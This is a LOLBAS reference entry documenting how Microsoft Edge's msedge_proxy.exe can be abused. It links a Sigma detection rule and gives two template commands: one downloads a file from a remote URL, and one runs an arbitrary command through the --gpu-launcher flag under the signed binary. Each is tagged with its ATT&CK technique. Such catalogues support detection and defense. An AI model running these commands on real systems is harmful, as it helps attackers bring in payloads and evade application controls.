---
title: "msedge_proxy.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/
fetched_at: 2026-09-20T17:12:10Z
license: unspecified
category: windows
---

Microsoft Edge Browser

## Paths
- C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe

## Acknowledgements
- Mert Daş ([@merterpreter](https://twitter.com/@merterpreter))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml)

## Download

1. msedge_proxy will download malicious file.

```
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
```

   - Use case: Download file from the internet

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

2. msedge_proxy.exe will execute file in the background

```
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

   - Use case: Executes a process under a trusted Microsoft signed binary

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1218.015

   - Tags: Execute: CMD
